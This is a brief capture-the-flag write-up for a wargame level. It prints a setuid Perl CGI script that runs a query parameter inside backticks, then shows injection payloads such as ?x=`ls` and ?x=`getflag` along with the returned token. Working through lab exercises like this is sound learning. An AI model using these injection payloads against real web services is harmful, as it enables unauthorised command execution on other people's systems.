# Flag 04
- ll
`-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*`
perl pinary :(

- `cat level04.pl `
```
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

- https://stackoverflow.com/questions/818255/in-the-shell-what-does-21-mean
- https://stackoverflow.com/questions/11255447/what-does-mean/11255498

- so the code redirect stdout and stderr to same output, and exec the x var

- access to localhost:4747 -> void web page

- so when I pass a x var, i get it in output
  - input: http://10.11.100.146:4747/?x=test
  - output: test
- try to pass arry
  - input: http://10.11.100.146:4747/?x[]=test
  - output: ""
- try to pass cmd in whitin backticks
  - input: http://10.11.100.146:4747/?x=`ls`
  - output: level04.pl
- Very goooood, so try to pass getflag cmd
  - input http://10.11.100.146:4747/?x=`getflag`
  - output: Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
















## Abstract
- Password flag03: 
- Password level04: 














